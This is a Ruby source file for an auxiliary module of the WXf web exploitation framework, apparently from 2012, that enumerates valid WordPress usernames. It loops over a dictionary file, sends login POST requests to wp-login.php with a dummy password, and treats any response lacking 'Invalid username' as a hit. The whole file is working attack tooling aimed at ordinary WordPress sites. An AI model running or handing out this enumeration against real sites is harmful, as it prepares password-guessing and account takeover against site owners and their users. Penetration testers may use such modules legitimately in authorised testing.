#!/usr/bin/env ruby
# 
# Created Oct 10, 2012
#

class WebXploit < WXf::WXfmod_Factory::Auxiliary

 include WXf::WXfassists::General::MechReq
  
  def initialize
      super(
        'Name'        => 'Wordpress Username Enumeration',
        'Version'     => '1.0',
        'Description' => %q{
          Enumerate valid wordpress usernames		},
        'Author'      => ['John Poulin' ],
        'License'     => WXF_LICENSE

      )
   
      init_opts([
		OptString.new('USERNAME', [true, "Username to enumerate", "root"]),
		OptString.new('VERBOSE', [false, "Show verbose output?", false]),
		OptString.new('DICT', [true, "Location of dictionary file", ""])
      ])
  
  end
  
  def run
	# Prepare file
	fname = datahash['DICT']
	file = File.new(fname, "r")

	while uname = file.gets
		uname.chop!
		params = "log=#{uname}&pwd=test1234&wp-submit=Log+In&redirect_to=#{rurl + "/wp-admin"}&testcookie=1"
		res = mech_req({
            		'method' => "POST",
            		'RURL'=> rurl + "/wp-login.php",
            		'RPARAMS' => params,
			'HEADERS' => {'Content-Type' => "application/x-www-form-urlencoded"}
         	})

		if valid_user? res
			print_good ("Valid Username: #{uname}")
		elsif datahash['VERBOSE']
			print_error ("Invalid Username: #{uname}")
		end	
	end
  end

  def valid_user? (r)
	return true unless r.body.include?("Invalid username")
  end
  
end
